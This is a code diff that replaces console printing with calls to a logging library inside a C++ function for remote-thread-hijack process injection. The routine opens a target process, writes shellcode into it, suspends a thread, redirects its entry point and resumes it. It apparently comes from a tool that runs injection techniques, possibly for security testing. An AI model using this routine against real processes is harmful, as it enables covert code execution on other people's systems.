@@ -2,6 +2,7 @@
 
 #include "sysapi.h"
 #include "scripts.h"
+#include "logging.h"
 
 namespace scripts {
 
@@ -9,13 +10,11 @@ bool inject_hijack_remote_thread(uint32_t pid,
                                  RemoteProcessOpenMethod open_method,
                                  RemoteProcessMemoryMethod memory_method) {
 
-    wprintf(L"\nOpening the target process\n");
+    bblog::info("[*] Opening the target process");
     sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
     if (ProcessHandle == NULL) {
         return false;
     }
-
-    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());
 
     bool is_64;
     bool res = sysapi::ProcessGetWow64Info(ProcessHandle.get(), is_64);
@@ -23,9 +22,9 @@ bool inject_hijack_remote_thread(uint32_t pid,
         return false;
     }
 
-    wprintf(L"  [+] process is %s-bit\n", is_64 ? L"64" : L"32");
+    bblog::info("process is {}-bit", is_64 ? "64" : "32");
 
-    wprintf(L"\nPlacing shellcode in the target process\n");
+    bblog::info("[*] Placing shellcode in the target process");
 
     RemoteProcessMemoryContext ctx;
     res = process_init_memory(ctx, memory_method, ProcessHandle.get(), pid);
@@ -40,28 +39,24 @@ bool inject_hijack_remote_thread(uint32_t pid,
         return false;
     }
 
-    wprintf(L"  [*] writing shellcode...\n");
+    bblog::info("writing shellcode...");
 
     res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
     if (!res) {
         return false;
     }
 
-    wprintf(L"\nHijacking a remote thread\n");
+    bblog::info("[*] Hijacking a remote thread");
 
     sysapi::unique_handle ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get());
     if (ThreadHandle == NULL) {
         return false;
     }
 
-    wprintf(L"  [+] thread opened, HANDLE = 0x%p\n", ThreadHandle.get());
-
     res = sysapi::ThreadSuspend(ThreadHandle.get());
     if (!res) {
         return false;
     }
-
-    wprintf(L"  [+] thread suspended, HANDLE = 0x%p\n", ThreadHandle.get());
 
 #if defined(_WIN64)
     if (is_64) {
@@ -78,16 +73,16 @@ bool inject_hijack_remote_thread(uint32_t pid,
         return false;
     }
 
-    wprintf(L"  [+] thread EP set, HANDLE = 0x%p\n", ThreadHandle.get());
+    bblog::info("thread EP set, HANDLE = 0x{:x}", (uintptr_t)ThreadHandle.get());
 
     res = sysapi::ThreadResume(ThreadHandle.get());
     if (!res) {
         return false;
     }
 
-    wprintf(L"  [+] thread resumed, HANDLE = 0x%p\n", ThreadHandle.get());
+    bblog::info("thread resumed, HANDLE = 0x{:x}", (uintptr_t)ThreadHandle.get());
 
-    wprintf(L"\nSuccess\n");
+    bblog::info("[+] Success");
     return true;
 }
 
